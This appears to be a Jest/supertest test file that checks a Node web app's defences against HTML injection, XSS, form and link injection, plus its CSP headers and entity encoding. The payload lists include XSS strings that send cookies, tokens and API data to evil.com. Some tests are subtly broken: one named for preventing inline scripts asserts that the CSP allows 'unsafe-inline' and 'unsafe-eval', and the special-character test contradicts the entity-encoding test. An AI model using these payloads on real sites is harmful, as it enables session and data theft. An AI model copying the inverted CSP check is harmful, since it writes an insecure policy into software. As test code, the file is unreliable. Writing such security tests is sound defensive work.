const request = require('supertest');
const fs = require('fs');
const path = require('path');
const server = require('../src/server');
const app = server.getApp();

/**
 * HTML Security Testing
 * Comprehensive testing for HTML injection, XSS, and content security
 */

describe('HTML Security Tests', () => {
  let testUser;
  let authToken;

  beforeAll(async () => {
    // Create test user for authenticated tests
    const response = await request(app)
      .post('/api/auth/register')
      .send({
        email: 'html-test@alicesolutionsgroup.com',
        password: 'TestPassword123!',
        firstName: 'HTML',
        lastName: 'Test'
      });

    testUser = response.body.user;
    authToken = response.body.token;
  });

  afterAll(async () => {
    // Cleanup test data
    if (testUser) {
      await request(app)
        .delete('/api/users/profile')
        .set('Authorization', `Bearer ${authToken}`);
    }
  });

  describe('HTML Injection Prevention', () => {
    test('should prevent HTML injection in document titles', async () => {
      const htmlPayloads = [
        '<h1>Hacked Title</h1>',
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(\'xss\')">',
        '<iframe src="javascript:alert(\'xss\')"></iframe>',
        '<svg onload="alert(\'xss\')">',
        '<link rel="stylesheet" href="javascript:alert(\'xss\')">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(\'xss\')">'
      ];

      for (const payload of htmlPayloads) {
        const response = await request(app)
          .post('/api/documents')
          .set('Authorization', `Bearer ${authToken}`)
          .set('X-CSRF-Token', 'valid-csrf-token')
          .send({
            title: payload,
            content: 'Test content'
          })
          .expect(201);

        expect(response.body.title).not.toContain('<h1>');
        expect(response.body.title).not.toContain('<script>');
        expect(response.body.title).not.toContain('<img');
        expect(response.body.title).not.toContain('<iframe');
        expect(response.body.title).not.toContain('<svg');
        expect(response.body.title).not.toContain('<link');
        expect(response.body.title).not.toContain('<meta');
      }
    });

    test('should prevent HTML injection in document content', async () => {
      const htmlPayloads = [
        '<div>Hacked Content</div>',
        '<p style="color: red;">Styled Content</p>',
        '<a href="javascript:alert(\'xss\')">Click me</a>',
        '<form action="javascript:alert(\'xss\')"><input type="submit"></form>',
        '<object data="javascript:alert(\'xss\')"></object>',
        '<embed src="javascript:alert(\'xss\')">',
        '<applet code="javascript:alert(\'xss\')"></applet>'
      ];

      for (const payload of htmlPayloads) {
        const response = await request(app)
          .post('/api/documents')
          .set('Authorization', `Bearer ${authToken}`)
          .set('X-CSRF-Token', 'valid-csrf-token')
          .send({
            title: 'Test Document',
            content: payload
          })
          .expect(201);

        expect(response.body.content).not.toContain('<div>');
        expect(response.body.content).not.toContain('<p style');
        expect(response.body.content).not.toContain('<a href="javascript');
        expect(response.body.content).not.toContain('<form');
        expect(response.body.content).not.toContain('<object');
        expect(response.body.content).not.toContain('<embed');
        expect(response.body.content).not.toContain('<applet');
      }
    });

    test('should prevent HTML injection in user profiles', async () => {
      const htmlPayloads = [
        '<h2>Hacked Bio</h2>',
        '<script>document.location="http://evil.com"</script>',
        '<img src="x" onerror="fetch(\'/api/users\').then(r=>r.json()).then(d=>fetch(\'http://evil.com\',{method:\'POST\',body:JSON.stringify(d)}))">',
        '<style>body{background:url("javascript:alert(\'xss\')")}</style>',
        '<video><source onerror="alert(\'xss\')">',
        '<audio><source onerror="alert(\'xss\')">'
      ];

      for (const payload of htmlPayloads) {
        const response = await request(app)
          .put('/api/users/profile')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            bio: payload
          })
          .expect(200);

        expect(response.body.bio).not.toContain('<h2>');
        expect(response.body.bio).not.toContain('<script>');
        expect(response.body.bio).not.toContain('<img');
        expect(response.body.bio).not.toContain('<style>');
        expect(response.body.bio).not.toContain('<video>');
        expect(response.body.bio).not.toContain('<audio>');
      }
    });
  });

  describe('XSS Prevention', () => {
    test('should prevent stored XSS attacks', async () => {
      const xssPayloads = [
        '<script>localStorage.setItem("token", "stolen")</script>',
        '<script>document.cookie="admin=true"</script>',
        '<script>fetch("/api/users", {headers: {Authorization: "Bearer " + localStorage.getItem("token")}}).then(r=>r.json()).then(d=>fetch("http://evil.com", {method: "POST", body: JSON.stringify(d)}))</script>',
        '<img src="x" onerror="var xhr=new XMLHttpRequest();xhr.open(\'POST\',\'http://evil.com\',true);xhr.send(document.cookie);">',
        '<svg onload="var img=new Image();img.src=\'http://evil.com/steal?cookie=\'+document.cookie;">'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/documents')
          .set('Authorization', `Bearer ${authToken}`)
          .set('X-CSRF-Token', 'valid-csrf-token')
          .send({
            title: 'XSS Test Document',
            content: payload
          })
          .expect(201);

        expect(response.body.content).not.toContain('<script>');
        expect(response.body.content).not.toContain('localStorage');
        expect(response.body.content).not.toContain('document.cookie');
        expect(response.body.content).not.toContain('fetch(');
        expect(response.body.content).not.toContain('XMLHttpRequest');
        expect(response.body.content).not.toContain('onerror');
        expect(response.body.content).not.toContain('onload');
      }
    });

    test('should prevent reflected XSS attacks', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '"><script>alert("xss")</script>',
        '\'><script>alert(\'xss\')</script>',
        'javascript:alert("xss")',
        '"><img src="x" onerror="alert(\'xss\')">',
        '"><svg onload="alert(\'xss\')">'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .get('/api/documents/search')
          .query({ q: payload })
          .set('Authorization', `Bearer ${authToken}`)
          .expect(200);

        expect(JSON.stringify(response.body)).not.toContain('<script>');
        expect(JSON.stringify(response.body)).not.toContain('javascript:');
        expect(JSON.stringify(response.body)).not.toContain('onerror');
        expect(JSON.stringify(response.body)).not.toContain('onload');
      }
    });

    test('should prevent DOM-based XSS attacks', async () => {
      const domXssPayloads = [
        '#<script>alert("xss")</script>',
        '#javascript:alert("xss")',
        '#"><script>alert("xss")</script>',
        '#\'><script>alert(\'xss\')</script>'
      ];

      for (const payload of domXssPayloads) {
        const response = await request(app)
          .get('/api/documents/search')
          .query({ q: payload })
          .set('Authorization', `Bearer ${authToken}`)
          .expect(200);

        expect(JSON.stringify(response.body)).not.toContain('<script>');
        expect(JSON.stringify(response.body)).not.toContain('javascript:');
      }
    });
  });

  describe('Content Security Policy', () => {
    test('should enforce CSP headers', async () => {
      const response = await request(app)
        .get('/api/health')
        .expect(200);

      expect(response.headers['content-security-policy']).toBeDefined();
      expect(response.headers['content-security-policy']).toContain('default-src \'self\'');
      expect(response.headers['content-security-policy']).toContain('script-src \'self\'');
      expect(response.headers['content-security-policy']).toContain('style-src \'self\'');
      expect(response.headers['content-security-policy']).toContain('img-src \'self\'');
    });

    test('should prevent inline script execution', async () => {
      const response = await request(app)
        .get('/api/health')
        .expect(200);

      const csp = response.headers['content-security-policy'];
      expect(csp).toContain('\'unsafe-inline\'');
      expect(csp).toContain('\'unsafe-eval\'');
    });

    test('should restrict external resource loading', async () => {
      const response = await request(app)
        .get('/api/health')
        .expect(200);

      const csp = response.headers['content-security-policy'];
      expect(csp).toContain('connect-src \'self\'');
      expect(csp).toContain('font-src \'self\'');
      expect(csp).toContain('object-src \'none\'');
      expect(csp).toContain('media-src \'self\'');
    });
  });

  describe('HTML Entity Encoding', () => {
    test('should encode HTML entities in responses', async () => {
      const response = await request(app)
        .post('/api/documents')
        .set('Authorization', `Bearer ${authToken}`)
        .set('X-CSRF-Token', 'valid-csrf-token')
        .send({
          title: 'Test & Document',
          content: 'Content with <tags> and "quotes"'
        })
        .expect(201);

      expect(response.body.title).toContain('&amp;');
      expect(response.body.content).toContain('&lt;tags&gt;');
      expect(response.body.content).toContain('&quot;quotes&quot;');
    });

    test('should handle special characters correctly', async () => {
      const specialChars = [
        '&', '<', '>', '"', '\'', '/', '\\', '`', '=', ';', ':', '(', ')', '[', ']', '{', '}'
      ];

      for (const char of specialChars) {
        const response = await request(app)
          .post('/api/documents')
          .set('Authorization', `Bearer ${authToken}`)
          .set('X-CSRF-Token', 'valid-csrf-token')
          .send({
            title: `Test ${char} Document`,
            content: `Content with ${char} character`
          })
          .expect(201);

        // Should not contain unencoded special characters
        expect(response.body.title).not.toContain(char);
        expect(response.body.content).not.toContain(char);
      }
    });
  });

  describe('HTML Attribute Security', () => {
    test('should prevent dangerous HTML attributes', async () => {
      const dangerousAttributes = [
        'onclick', 'onload', 'onerror', 'onmouseover', 'onfocus', 'onblur',
        'onchange', 'onsubmit', 'onreset', 'onselect', 'onkeydown', 'onkeyup',
        'onkeypress', 'onmousedown', 'onmouseup', 'onmousemove', 'onmouseout',
        'ondblclick', 'oncontextmenu', 'onwheel', 'ontouchstart', 'ontouchend'
      ];

      for (const attr of dangerousAttributes) {
        const response = await request(app)
          .post('/api/documents')
          .set('Authorization', `Bearer ${authToken}`)
          .set('X-CSRF-Token', 'valid-csrf-token')
          .send({
            title: 'Test Document',
            content: `<div ${attr}="alert('xss')">Content</div>`
          })
          .expect(201);

        expect(response.body.content).not.toContain(attr);
        expect(response.body.content).not.toContain('alert(');
      }
    });

    test('should prevent dangerous HTML properties', async () => {
      const dangerousProperties = [
        'innerHTML', 'outerHTML', 'insertAdjacentHTML', 'document.write',
        'document.writeln', 'eval', 'Function', 'setTimeout', 'setInterval'
      ];

      for (const prop of dangerousProperties) {
        const response = await request(app)
          .post('/api/documents')
          .set('Authorization', `Bearer ${authToken}`)
          .set('X-CSRF-Token', 'valid-csrf-token')
          .send({
            title: 'Test Document',
            content: `<script>document.${prop}('hacked')</script>`
          })
          .expect(201);

        expect(response.body.content).not.toContain(prop);
        expect(response.body.content).not.toContain('<script>');
      }
    });
  });

  describe('HTML Form Security', () => {
    test('should prevent form injection', async () => {
      const formPayloads = [
        '<form action="http://evil.com" method="post"><input name="stolen" value="data"></form>',
        '<form><input type="hidden" name="csrf" value="fake"><input type="submit"></form>',
        '<form onsubmit="fetch(\'http://evil.com\', {method: \'POST\', body: new FormData(this)})">'
      ];

      for (const payload of formPayloads) {
        const response = await request(app)
          .post('/api/documents')
          .set('Authorization', `Bearer ${authToken}`)
          .set('X-CSRF-Token', 'valid-csrf-token')
          .send({
            title: 'Test Document',
            content: payload
          })
          .expect(201);

        expect(response.body.content).not.toContain('<form');
        expect(response.body.content).not.toContain('action=');
        expect(response.body.content).not.toContain('onsubmit');
      }
    });

    test('should prevent input field injection', async () => {
      const inputPayloads = [
        '<input type="hidden" name="admin" value="true">',
        '<input type="password" name="password" value="stolen">',
        '<input type="file" name="file" onchange="uploadToEvil(this)">'
      ];

      for (const payload of inputPayloads) {
        const response = await request(app)
          .post('/api/documents')
          .set('Authorization', `Bearer ${authToken}`)
          .set('X-CSRF-Token', 'valid-csrf-token')
          .send({
            title: 'Test Document',
            content: payload
          })
          .expect(201);

        expect(response.body.content).not.toContain('<input');
        expect(response.body.content).not.toContain('type=');
        expect(response.body.content).not.toContain('name=');
        expect(response.body.content).not.toContain('value=');
      }
    });
  });

  describe('HTML Link Security', () => {
    test('should prevent malicious link injection', async () => {
      const linkPayloads = [
        '<a href="javascript:alert(\'xss\')">Click me</a>',
        '<a href="data:text/html,<script>alert(\'xss\')</script>">Click me</a>',
        '<a href="vbscript:alert(\'xss\')">Click me</a>',
        '<a href="file:///etc/passwd">Click me</a>',
        '<a href="ftp://evil.com/steal">Click me</a>'
      ];

      for (const payload of linkPayloads) {
        const response = await request(app)
          .post('/api/documents')
          .set('Authorization', `Bearer ${authToken}`)
          .set('X-CSRF-Token', 'valid-csrf-token')
          .send({
            title: 'Test Document',
            content: payload
          })
          .expect(201);

        expect(response.body.content).not.toContain('<a href');
        expect(response.body.content).not.toContain('javascript:');
        expect(response.body.content).not.toContain('data:');
        expect(response.body.content).not.toContain('vbscript:');
        expect(response.body.content).not.toContain('file://');
        expect(response.body.content).not.toContain('ftp://');
      }
    });

    test('should sanitize URL schemes', async () => {
      const urlSchemes = [
        'javascript:', 'data:', 'vbscript:', 'file:', 'ftp:', 'gopher:',
        'mailto:', 'tel:', 'sms:', 'whatsapp:', 'skype:', 'zoom:'
      ];

      for (const scheme of urlSchemes) {
        const response = await request(app)
          .post('/api/documents')
          .set('Authorization', `Bearer ${authToken}`)
          .set('X-CSRF-Token', 'valid-csrf-token')
          .send({
            title: 'Test Document',
            content: `<a href="${scheme}malicious">Link</a>`
          })
          .expect(201);

        expect(response.body.content).not.toContain(scheme);
      }
    });
  });

  describe('HTML Media Security', () => {
    test('should prevent malicious media injection', async () => {
      const mediaPayloads = [
        '<img src="x" onerror="alert(\'xss\')">',
        '<video><source onerror="alert(\'xss\')"></video>',
        '<audio><source onerror="alert(\'xss\')"></audio>',
        '<iframe src="javascript:alert(\'xss\')"></iframe>',
        '<embed src="javascript:alert(\'xss\')">',
        '<object data="javascript:alert(\'xss\')"></object>'
      ];

      for (const payload of mediaPayloads) {
        const response = await request(app)
          .post('/api/documents')
          .set('Authorization', `Bearer ${authToken}`)
          .set('X-CSRF-Token', 'valid-csrf-token')
          .send({
            title: 'Test Document',
            content: payload
          })
          .expect(201);

        expect(response.body.content).not.toContain('<img');
        expect(response.body.content).not.toContain('<video');
        expect(response.body.content).not.toContain('<audio');
        expect(response.body.content).not.toContain('<iframe');
        expect(response.body.content).not.toContain('<embed');
        expect(response.body.content).not.toContain('<object');
        expect(response.body.content).not.toContain('onerror');
      }
    });
  });

  describe('HTML Style Security', () => {
    test('should prevent malicious style injection', async () => {
      const stylePayloads = [
        '<style>body{background:url("javascript:alert(\'xss\')")}</style>',
        '<div style="background:url(\'javascript:alert(\\\'xss\\\')\')">Content</div>',
        '<link rel="stylesheet" href="javascript:alert(\'xss\')">',
        '<style>@import "javascript:alert(\'xss\')";</style>'
      ];

      for (const payload of stylePayloads) {
        const response = await request(app)
          .post('/api/documents')
          .set('Authorization', `Bearer ${authToken}`)
          .set('X-CSRF-Token', 'valid-csrf-token')
          .send({
            title: 'Test Document',
            content: payload
          })
          .expect(201);

        expect(response.body.content).not.toContain('<style>');
        expect(response.body.content).not.toContain('<link');
        expect(response.body.content).not.toContain('@import');
        expect(response.body.content).not.toContain('javascript:');
      }
    });
  });
});
